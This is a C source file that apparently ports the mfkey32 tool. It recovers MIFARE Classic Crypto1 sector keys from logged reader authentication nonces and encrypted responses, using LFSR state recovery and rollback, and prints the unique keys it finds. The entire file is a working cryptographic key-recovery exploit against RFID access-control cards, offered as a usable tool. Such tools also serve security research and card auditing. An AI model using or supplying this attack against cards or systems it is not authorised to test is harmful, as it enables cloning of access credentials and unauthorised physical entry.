#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define LF_POLY_ODD (0x29CE5C)
#define LF_POLY_EVEN (0x870804)
#define BIT(x, n) ((x) >> (n) & 1)
#define BEBIT(x, n) BIT(x, (n) ^ 24)
#define SWAPENDIAN(x) (x = (x >> 8 & 0xff00ff) | (x & 0xff00ff) << 8, x = x >> 16 | x << 16)
#define SIZEOF(arr) sizeof(arr) / sizeof(*arr)
struct Crypto1State {uint32_t odd, even;};
uint32_t prng_successor(uint32_t x, uint32_t n) {
    SWAPENDIAN(x);
    while (n--)
        x = x >> 1 | (x >> 16 ^ x >> 18 ^ x >> 19 ^ x >> 21) << 31;
    return SWAPENDIAN(x);
}
static inline int filter(uint32_t const x) {
    uint32_t f;
    f  = 0xf22c0 >> (x       & 0xf) & 16;
    f |= 0x6c9c0 >> (x >>  4 & 0xf) &  8;
    f |= 0x3c8b0 >> (x >>  8 & 0xf) &  4;
    f |= 0x1e458 >> (x >> 12 & 0xf) &  2;
    f |= 0x0d938 >> (x >> 16 & 0xf) &  1;
    return BIT(0xEC57E80A, f);
}
static inline uint8_t evenparity32(uint32_t x) {
    return (__builtin_parity(x) & 0xFF);
}
int binsearch(int data[], int start, int stop) {
    int mid, val = data[stop] & 0xff000000;
    while (start != stop) {
        mid = (stop - start) >> 1;
        if ((data[start + mid] ^ 0x80000000) > (val ^ 0x80000000))
            stop = start + mid;
        else
            start += mid + 1;
    }
    return start;
}
void quicksort(int data[], int start, int stop){
    int it = start + 1, rit = stop, t;
    if (it > rit) {
        return;
    }
    while(it < rit) {
        if( (data[it] ^ 0x80000000) <= (data[start] ^ 0x80000000) ) {
            ++it;
        }
        else if((data[rit] ^ 0x80000000) > (data[start] ^ 0x80000000)) {
            --rit;
        }
        else {
            t = data[it];
            data[it] = data[rit];
            data[rit] = t;
        }
    }
    if((data[rit] ^ 0x80000000) >= (data[start] ^ 0x80000000)) {
        --rit;
    }
    if(rit != start) {
        t = data[rit];
        data[rit] = data[start];
        data[start] = t;
    }
    quicksort(data, start, rit - 1);
    quicksort(data, rit + 1, stop);
}
void quickSort(int array[], int low, int high) {
    if (SIZEOF(array) == 0)
        return;
    if (low >= high)
        return;
    int middle = low + (high - low) / 2;
    int pivot = array[middle];
    int i = low, j = high;
    while (i <= j) {
        while (array[i] < pivot) {
            i++;
        }
        while (array[j] > pivot) {
            j--;
        }
        if (i <= j) { // swap
            int temp = array[i];
            array[i] = array[j];
            array[j] = temp;
            i++;
            j--;
        }
    }
    if (low < j) {
        quickSort(array, low, j);
    }
    if (high > i) {
        quickSort(array, i, high);
    }
}
void update_contribution(int data[], int item, int mask1, int mask2) {
    int p = data[item] >> 25;
    p = p << 1 | evenparity32(data[item] & mask1);
    p = p << 1 | evenparity32(data[item] & mask2);
    data[item] = p << 24 | (data[item] & 0xffffff);
}
int extend_table(int data[], int tbl, int end, int bit, int m1, int m2) {
    for (data[tbl] <<= 1; tbl <= end; data[++tbl] <<= 1) {
        if ((filter(data[tbl]) ^ filter(data[tbl] | 1)) != 0) {
            data[tbl] |= filter(data[tbl]) ^ bit;
            update_contribution(data, tbl, m1, m2);
        } else if (filter(data[tbl]) == bit) {
            data[++end] = data[tbl + 1];
            data[tbl + 1] = data[tbl] | 1;
            update_contribution(data, tbl, m1, m2);
            tbl++;
            update_contribution(data, tbl, m1, m2);
        } else {
            data[tbl--] = data[end--];
        }
    }
    return end;
}
int extend_table_simple(int data[], int tbl, int end, int bit) {
    for(data[ tbl ] <<= 1; tbl <= end; data[++tbl] <<= 1) {
        if ((filter(data[ tbl ]) ^ filter(data[ tbl ] | 1)) !=0 )
            data[ tbl ] |= filter(data[ tbl ]) ^ bit;
        else if (filter(data[ tbl ]) == bit) {
            data[ ++end ] = data[ ++tbl ];
            data[ tbl ] = data[ tbl - 1 ] | 1;
        } else {
            data[ tbl-- ] = data[ end-- ];
        }
    }
    return end;
}
int recover(int odd[], int o_head, int o_tail, int oks, int even[], int e_head, int e_tail, int eks, int rem,
            struct Crypto1State sl[], int s) {
    int o, e, i;
    if (rem == -1) {
        for (e = e_head; e <= e_tail; ++e) {
            even[e] = (even[e] << 1) ^ evenparity32(even[e] & LF_POLY_EVEN);
            for (o = o_head; o <= o_tail; ++o, ++s) {
                sl[s].even = odd[o];
                sl[s].odd = even[e] ^ evenparity32(odd[o] & LF_POLY_ODD);
                sl[s + 1].odd = sl[s + 1].even = 0;
            }
        }
        return s;
    }
    for (i = 0; (i < 4) && (rem-- != 0); i++) {
        oks >>= 1;
        eks >>= 1;
        o_tail = extend_table(odd, o_head, o_tail, oks & 1, LF_POLY_EVEN << 1 | 1, LF_POLY_ODD << 1);
        if (o_head > o_tail)
            return s;
        e_tail = extend_table(even, e_head, e_tail, eks & 1, LF_POLY_ODD, LF_POLY_EVEN << 1 | 1);
        if (e_head > e_tail)
            return s;
    }
    quicksort(odd, o_head, o_tail);
    quicksort(even, e_head, e_tail);
    while (o_tail >= o_head && e_tail >= e_head) {
        if (((odd[o_tail] ^ even[e_tail]) >> 24) == 0) {
            o_tail = binsearch(odd, o_head, o = o_tail);
            e_tail = binsearch(even, e_head, e = e_tail);
            s = recover(odd, o_tail--, o, oks, even, e_tail--, e, eks, rem, sl, s);
        } else if ((odd[o_tail] ^ 0x80000000) > (even[e_tail] ^ 0x80000000)) {
            o_tail = binsearch(odd, o_head, o_tail) - 1;
        } else {
            e_tail = binsearch(even, e_head, e_tail) - 1;
        }
    }

    return s;
}
struct Crypto1State* lfsr_recovery32(int ks2) {
    struct Crypto1State *statelist;
    int stl = 0;
    int odd_head = 0, odd_tail = -1, oks = 0;
    int even_head = 0, even_tail = -1, eks = 0;
    int *odd = calloc(1, sizeof(int) << 20);
    int *even = calloc(1, sizeof(int) << 20);
    statelist =  calloc(1, sizeof(struct Crypto1State) << 18);
    int i;
    for(i = 0; i < (1 << 18); i++) {
        statelist[i].odd = 0;
        statelist[i].even = 0;
    }
    for (i = 31; i >= 0; i -= 2)
        oks = oks << 1 | BEBIT(ks2, i);
    for (i = 30; i >= 0; i -= 2)
        eks = eks << 1 | BEBIT(ks2, i);
    statelist[stl].odd = statelist[stl].even = 0;
    for (i = 1 << 20; i >= 0; --i) {
        if (filter(i) == (oks & 1))
            odd[++odd_tail] = i;
        if (filter(i) == (eks & 1))
            even[++even_tail] = i;
    }
    for (i = 0; i < 4; i++) {
        odd_tail = extend_table_simple(odd, odd_head, odd_tail, ((oks >>= 1) & 1));
        even_tail = extend_table_simple(even, even_head, even_tail, ((eks >>= 1) & 1));
    }
    recover(odd, odd_head, odd_tail, oks, even, even_head, even_tail, eks, 11, statelist, 0);
    free(odd);
    free(even);
    return statelist;
}
void crypto1_get_lfsr(struct Crypto1State *state, uint64_t *lfsr) {
    int i;
    for (*lfsr = 0, i = 23; i >= 0; --i) {
        *lfsr = *lfsr << 1 | BIT(state->odd, i ^ 3);
        *lfsr = *lfsr << 1 | BIT(state->even, i ^ 3);
    }
}
uint8_t crypt_or_rollback_bit(struct Crypto1State *s, uint32_t in, int x, int is_crypt) {
    uint8_t ret;
    uint32_t feedin, t;
    if (is_crypt == 0) {
        s->odd &= 0xffffff;
        t = s->odd, s->odd = s->even, s->even = t;
    }
    ret = filter(s->odd);
    feedin = ret & (!!x);
    if (is_crypt == 0) {
        feedin ^= s->even & 1;
        feedin ^= LF_POLY_EVEN & (s->even >>= 1);
    } else {
        feedin ^= LF_POLY_EVEN & s->even;
    }
    feedin ^= LF_POLY_ODD & s->odd;
    feedin ^= !!in;
    if (is_crypt == 0) {
        s->even |= (evenparity32(feedin)) << 23;
    } else {
        s->even = s->even << 1 | (evenparity32(feedin));
        t = s->odd, s->odd = s->even, s->even = t;
    }
    return ret;
}
uint32_t crypt_or_rollback_word(struct Crypto1State *s, uint32_t in, int x, int is_crypt) {
    uint32_t ret = 0;
    int i;
    if (is_crypt == 0) {
        for (i = 31; i >= 0; i--) {
            ret |= crypt_or_rollback_bit(s, BEBIT(in, i), x, 0) << (24 ^ i);
        }
    } else {
        for (i = 0; i <= 31; i++) {
            ret |= crypt_or_rollback_bit(s, BEBIT(in, i), x, 1) << (24 ^ i);
        }
    }
    return ret;
}

int main(int argc, char *argv[]) {
    struct Crypto1State *s, *t;
    uint64_t key;     // recovered key
    uint32_t uid;     // serial number
    uint32_t nt0;      // tag challenge first
    uint32_t nt1;      // tag challenge second
    uint32_t nr0_enc; // first encrypted reader challenge
    uint32_t ar0_enc; // first encrypted reader response
    uint32_t nr1_enc; // second encrypted reader challenge
    uint32_t ar1_enc; // second encrypted reader response
    int i;
    char *rest;
    char *token;
    size_t keyarray_size;
    uint64_t *keyarray = malloc(sizeof(uint64_t)*1);

    keyarray_size = 0;
    FILE* filePointer;
    int bufferLength = 255;
    char buffer[bufferLength];
    filePointer = fopen(".mfkey32.log", "r"); // TODO: In FAP, use full path

    while(fgets(buffer, bufferLength, filePointer)) {
        rest = buffer;
        for (i = 0; i <= 17; i++) {
            token = strtok_r(rest, " ", &rest);
            switch(i){
                case 5: sscanf(token, "%x", &uid); break;
                case 7: sscanf(token, "%x", &nt0); break;
                case 9: sscanf(token, "%x", &nr0_enc); break;
                case 11: sscanf(token, "%x", &ar0_enc); break;
                case 13: sscanf(token, "%x", &nt1); break;
                case 15: sscanf(token, "%x", &nr1_enc); break;
                case 17: sscanf(token, "%x", &ar1_enc); break;
                default: break; // Do nothing
            }
        }
        uint32_t p64 = prng_successor(nt0, 64);
        uint32_t p64b = prng_successor(nt1, 64);
        s = lfsr_recovery32(ar0_enc ^ p64);
        for (t = s; t->odd | t->even; ++t) {
            crypt_or_rollback_word(t, 0, 0, 0);
            crypt_or_rollback_word(t, nr0_enc, 1, 0);
            crypt_or_rollback_word(t, uid ^ nt0, 0, 0);
            crypto1_get_lfsr(t, &key);
            crypt_or_rollback_word(t, uid ^ nt1, 0, 1);
            crypt_or_rollback_word(t, nr1_enc, 1, 1);
            if (ar1_enc == (crypt_or_rollback_word(t, 0, 0, 1) ^ p64b)) {
                int found = 0;
                for(i = 0; i < keyarray_size; i++) {
                    if (keyarray[i] == key) {
                        found = 1;
                        break;
                    }
                }
                if (found == 0) {
                    keyarray = realloc(keyarray, sizeof(uint64_t)*(keyarray_size+1));
                    keyarray_size += 1;
                    keyarray[keyarray_size-1] = key;
                }
                break;
            }
        }
        free(s);
    }

    fclose(filePointer);
    printf("Unique keys found:\n");
    for(i = 0; i < keyarray_size; i++) {
        printf("%012" PRIx64 , keyarray[i]);
        printf("\n");
    }
    // TODO: Append key to user dictionary file if missing in file
    return 0;
}
